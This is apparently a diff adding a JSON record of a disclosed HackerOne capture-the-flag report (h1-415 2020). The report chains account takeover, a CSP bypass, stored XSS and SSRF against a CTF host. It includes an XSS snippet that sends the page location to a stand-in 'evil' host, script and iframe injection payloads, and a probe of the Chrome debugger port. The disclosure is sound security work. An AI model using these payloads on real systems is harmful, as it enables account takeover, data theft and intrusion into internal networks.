@@ -1,0 +1,135 @@
+{
+  "id": 781281,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODEyODE=",
+  "url": "https://hackerone.com/reports/781281",
+  "title": "[h1-415 2020] Chain of vulnerabilities leading to account takeover and unauthorized access of sensitive internal resources",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-01-23T06:00:34.450Z",
+  "submitted_at": "2020-01-23T06:00:34.450Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "checkm50",
+    "url": "/checkm50",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 46757,
+    "url": "https://hackerone.com/h1-ctf",
+    "handle": "h1-ctf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "h1-ctf",
+      "twitter_handle": "Hacker0x01",
+      "website": "",
+      "about": "Let's save the holidays together! #TogetherWeHitHarder"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-02-03T21:33:38.441Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-02-03T21:33:38.371Z",
+  "team_member_agreed_on_going_public_at": "2020-02-03T20:35:38.725Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Note:\n**Please read this report as \"An attacker taking over a customer's account\" and not as \"helping Jobert recovering his document\" :)**\n\n## Summary:\nChaining following issues let's an attacker access sensitive information,\n1. Exposure of customer email and regex logic error leading to account takeover\n2. CSP bypass leading to arbitrary script execution on support portal and forced browsing\n3. Exposure of internal host name\n4. Insufficient authorization control allowing attacker to update other user's details\n5. Stored XSS + SSRF leading to port scanning and access to internal resources\n\n## Steps To Reproduce:\n1. Regex logic error leading to account takeover - jobert@mydocz.cosmic email exposed in source code\n   1a. 'jobert@mydocz.cosmic' seems to be a customer of MyDocz and the system does not allow any new registration with same email ID\n   1b. Turn BurpSuite intercept on and capture following request,\n         https://h1-415.h1ctf.com/register\n   1c. Modify the email ID parameter as 'jobert@mydocz.cosmic<' , the flaw here is the QR code generation process trims following symbols \n         {<>}\n   1d. Now after registration, save the QR code that the system generates\n   1e. Logout of the application and navigate to https://h1-415.h1ctf.com/recover\n   1f. Select the QR code saved previously and **now you have become jobert@mydocz.cosmic**\n\n2. CSP bypass leading to arbitrary script execution on support portal and forced browsing\n     2a. Support portal is vulnerable to HTML injection. One can bypass CSP rules like this\n     https://raw.githack.com/mattboldt/typed.js/master/lib/@https://github.com/checkm50/checkm50.github.io/master/40.js\n     2b. This triggers script execution on support portal but it is self-xss\n     2c. Now right click on firefox/chrome and run following function,\n           showReviewModal()\n     2d. Rating 1 star makes the support agent review the chat logs and hence the script can be executed on agent's client\n     2e. With a crafted script like below (Same as the script on 40.js), an attacker and gain information about the URL that the support agent \n      is using,\n      ```loc = document.location\n      var img1 = document.createElement('img');\n      img1.src = 'http://evil/image.png?loc='+loc\n      document.body.appendChild(img1);```\n\n3. Exposure of internal host name and user agent\n    3a. After performing step 2e, the attacker can now see the internal URL that the agent is using,\n    https://localhost:3000/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\n    3b. Attacker can change the 'localhost:3000' to 'h1-415.h1ctf.com' in order to access the chat page that the support agent is viewing\n \n\n4. Insufficient authorization control allowing attacker to update other user's details,\nFor further attack we need two accounts. We already have one, an attacker can also create trial account. **We will refer to this account as second account**\n    4a. As you can see, the review page from step 3a. contains an option to update user details\n    4b. Attacker can now update second account's \"name\" field, using following POST call,\n          https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\n          name=<inject-here>&email=jobert%40mydocz.cosmic&username=jobert&user_id=<second account user_id>&_csrf_token=987d\n\n5. Stored XSS + SSRF leading to port scanning and access to internal resources\n     5a. From step 4b, we know that an attacker has to ability to update account information of another user\n     5b. This becomes worst because the attacker is also able to inject script like below\n     name=<script src='external.com/some.js'>&email=jobert%40mydocz.cosmic&username=jobert&user_id=6&_csrf_token=987d\n     5c. An attacker can use this to inject an iframe like below and escalate the situation to SSRF (Port scanning and access internal resource)\n     name=<iframe src='http://localhost:9222/json' width=900 height=900></iframe>\n     5d. 9222 port because the user-agent says that it is headless chrome hence 9222 which is the debugger port\n     5e. the /json end point reveals a secret document\n\nThe secret document contains,\n## h1ctf{y3s_1m_c0sm1c_n0w}\n\n## Supporting Material/References:\n1. Support-portal.png\n2. chat-review-page.png\n3. external-interaction-ssrftest.png\n4. user-update-ssrf.png\n5. The-FLAG.png\n\nSpecial thanks to @pirateducky, @almadjus and @mcipekci  :)\n\n##Remediation:\nHire me :)\n\n## Impact\n\nAn attacker is able to, \nachieve **take over of customers account**, \n**compromise the integrity** of the platform by updating other user accounts\n**Infiltrate into internal network**\nresulting in **Critical** impact",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-03-04T20:35:38.814Z",
+  "allow_singular_disclosure_after": -194985872.14075574,
+  "singular_disclosure_allowed": true,
+  "vote_count": 10,
+  "voters": [
+    "nytr0gen",
+    "0xacb",
+    "defparam",
+    "rook1337",
+    "sameerphad72",
+    "nukedx",
+    "b9372d4605459ca97219795",
+    "hrw",
+    "raginx",
+    "shivam010"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 42751,
+    "asset_type": "URL",
+    "asset_identifier": "h1-415.h1ctf.com",
+    "max_severity": "none"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
